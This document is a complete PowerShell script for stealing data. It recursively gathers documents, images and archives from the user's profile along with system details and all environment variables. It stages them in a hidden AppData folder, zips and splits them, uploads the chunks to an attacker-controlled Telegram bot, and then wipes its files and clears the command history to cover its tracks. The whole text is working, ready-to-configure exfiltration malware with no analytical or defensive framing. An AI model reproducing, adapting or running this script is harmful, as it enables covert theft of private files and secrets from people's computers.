# Customizable Parameters
$TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"  # Replace with your bot token
$TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"               # Replace with your chat ID
$ROOT_DIRECTORY = "$env:USERPROFILE"             # Root directory to start searching from
$HIDDEN_DIRECTORY = "$env:APPDATA\Microsoft\Windows\HiddenFolder"  # Hidden directory path
$MAX_FILE_SIZE = 45MB                            # 45 MB (to stay under Telegram's 50 MB limit)

# File types to collect (e.g., documents, images, etc.)
$FILE_TYPES = @("*.txt", "*.doc", "*.docx", "*.pdf", "*.xls", "*.xlsx", "*.jpg", "*.png", "*.zip", "*.rar")

# Function to send a message to Telegram
function Send-ToTelegram {
    param (
        [string]$Message
    )
    $url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage"
    $body = @{
        chat_id = $TELEGRAM_CHAT_ID
        text = $Message
    }
    Invoke-RestMethod -Uri $url -Method Post -Body $body
}

# Function to send a file to Telegram
function Send-FileToTelegram {
    param (
        [string]$FilePath
    )
    $url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendDocument"
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $fileContent = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
    $boundary = [System.Guid]::NewGuid().ToString()
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"chat_id`"",
        "",
        $TELEGRAM_CHAT_ID,
        "--$boundary",
        "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
        "Content-Type: application/octet-stream",
        "",
        $fileContent,
        "--$boundary--"
    ) -join "`r`n"
    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }
    Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $bodyLines
}

# Function to collect system information
function Get-SystemInfo {
    $info = @()
    $info += "=== System Information ==="
    $info += "Hostname: $env:COMPUTERNAME"
    $info += "Username: $env:USERNAME"
    $info += "Operating System: $(Get-WmiObject Win32_OperatingSystem).Caption"
    $info += "Current Directory: $(Get-Location)"
    $info += "Environment Variables:"
    Get-ChildItem Env: | ForEach-Object { $info += "$($_.Name)=$($_.Value)" }
    return ($info -join "`n")
}

# Function to collect files of specific types
function Get-FilesFromDirectory {
    param (
        [string]$Directory
    )
    $files = @()
    foreach ($fileType in $FILE_TYPES) {
        $files += Get-ChildItem -Path $Directory -Recurse -Include $fileType -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
    }
    return $files
}

# Function to create a ZIP file
function Create-ZipFile {
    param (
        [string]$SourceFolder,
        [string]$ZipFilePath
    )
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($SourceFolder, $ZipFilePath)
}

# Function to split a file into smaller chunks
function Split-File {
    param (
        [string]$FilePath,
        [string]$OutputPrefix
    )
    $fileStream = [System.IO.File]::OpenRead($FilePath)
    $bufferSize = $MAX_FILE_SIZE
    $buffer = New-Object byte[] $bufferSize
    $partNumber = 1

    while ($fileStream.Position -lt $fileStream.Length) {
        $bytesRead = $fileStream.Read($buffer, 0, $bufferSize)
        $partFilePath = "$OutputPrefix.part_$partNumber"
        [System.IO.File]::WriteAllBytes($partFilePath, $buffer[0..($bytesRead - 1)])
        $partNumber++
    }

    $fileStream.Close()
}

# Function to delete footprints
function Remove-Footprints {
    # Delete the hidden directory and its contents
    Remove-Item -Path $HIDDEN_DIRECTORY -Recurse -Force -ErrorAction SilentlyContinue
    # Delete the temporary ZIP file and its parts
    Remove-Item -Path "$HIDDEN_DIRECTORY.zip", "$HIDDEN_DIRECTORY.part_*" -Force -ErrorAction SilentlyContinue
    # Clear PowerShell command history
    Clear-History
}

# Main function
function Main {
    # Create a hidden directory
    New-Item -Path $HIDDEN_DIRECTORY -ItemType Directory -Force | Out-Null

    # Collect system information
    $systemInfo = Get-SystemInfo
    $systemInfoFilePath = "$HIDDEN_DIRECTORY\system_info.txt"
    $systemInfo | Out-File -FilePath $systemInfoFilePath

    # Collect files of specific types
    Write-Host "Collecting files from $ROOT_DIRECTORY..."
    $files = Get-FilesFromDirectory -Directory $ROOT_DIRECTORY
    foreach ($file in $files) {
        Write-Host "Copying $file to $HIDDEN_DIRECTORY"
        Copy-Item -Path $file -Destination $HIDDEN_DIRECTORY -Force
    }

    # Compress the hidden directory into a ZIP file
    Write-Host "Creating ZIP file..."
    $zipFilePath = "$HIDDEN_DIRECTORY.zip"
    Create-ZipFile -SourceFolder $HIDDEN_DIRECTORY -ZipFilePath $zipFilePath

    # Split the ZIP file into smaller chunks
    Write-Host "Splitting ZIP file..."
    Split-File -FilePath $zipFilePath -OutputPrefix $HIDDEN_DIRECTORY

    # Send each chunk to Telegram
    Write-Host "Sending ZIP file parts to Telegram..."
    foreach ($part in (Get-ChildItem -Path "$HIDDEN_DIRECTORY.part_*")) {
        Send-FileToTelegram -FilePath $part.FullName
    }

    # Delete footprints
    Write-Host "Cleaning up..."
    Remove-Footprints

    Write-Host "Done!"
}

# Run the main function
Main
